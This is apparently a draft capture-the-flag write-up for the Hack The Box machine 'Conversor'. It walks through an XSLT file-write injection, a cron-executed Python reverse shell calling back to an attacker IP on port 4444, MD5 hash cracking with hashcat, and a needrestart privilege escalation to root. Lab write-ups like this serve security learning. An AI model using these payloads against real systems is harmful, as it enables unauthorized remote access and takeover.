---
slug: /write-up/htb/machines/easy/conversor
pagination_next: null
pagination_prev: null
draft: true
---

## Conversor

Web service that allows the user to upload XML document and XSLT to generate HTML.

### Enumeration

Browsing the website, we can obtain the source code. Checking the source code, we can see the `/convert` implementation which looks like it is protected against XXE attack:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
transform = etree.XSLT(xslt_tree)
result_tree = transform(xml_tree)
result_html = str(result_tree)
```

The problem is in `etree.XSLT(xslt_tree)` which has default access control. Following the [XSLT injection in PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection) we can write files in the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exslt="http://exslt.org/common" 
  extension-element-prefixes="exslt"
  version="1.0">
  <xsl:template match="/">
    <exslt:document href="/var/www/conversor.htb/static/test.txt" method="text">
test
    </exslt:document>
  </xsl:template>
</xsl:stylesheet>
```

We can verify if the test file is written by going to http://conversor.htb/static/test.txt. If the file is there, we have confirmed the vulnerability.

Now, reading the source code, we see the following comment in the `install.md` file:

```text
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

### Foothold

So, we can drop a python script there and it will get executed, leading to RCE, e.g:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exslt="http://exslt.org/common" 
  extension-element-prefixes="exslt"
  version="1.0">
  <xsl:template match="/">
    <exslt:document href="/var/www/conversor.htb/scripts/hello.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.21",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
    </exslt:document>
  </xsl:template>
</xsl:stylesheet>
```

The reverse shell will not connect immediately, you'll need to wait a bit until the cron task pick up the script and execute it.

The reverse shell will give us access to `www-data` user which we'll need to use for lateral movement.

### Lateral movement

We discover there's one user named `fismathack` on the machine.

We now have access to the sqlite database, where we can see the md5 hash of a user called `fismathack`. Running a wordlist attack on the hash will reveal the password and allow us to connect and retrieve the user flag:

```shell
hashcat -m 0 hash -a 0 /usr/share/wordlists/rockyou.txt
```

### Privilege escalation

The user can run `needrestart` binary as sudo without specifying the password

```shell
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Looks like this script is vulnerable: [https://github.com/ten-ops/CVE-2024-48990_needrestart](https://github.com/ten-ops/CVE-2024-48990_needrestart)

When run the `poc` we land in a shell belonging to `root` user.
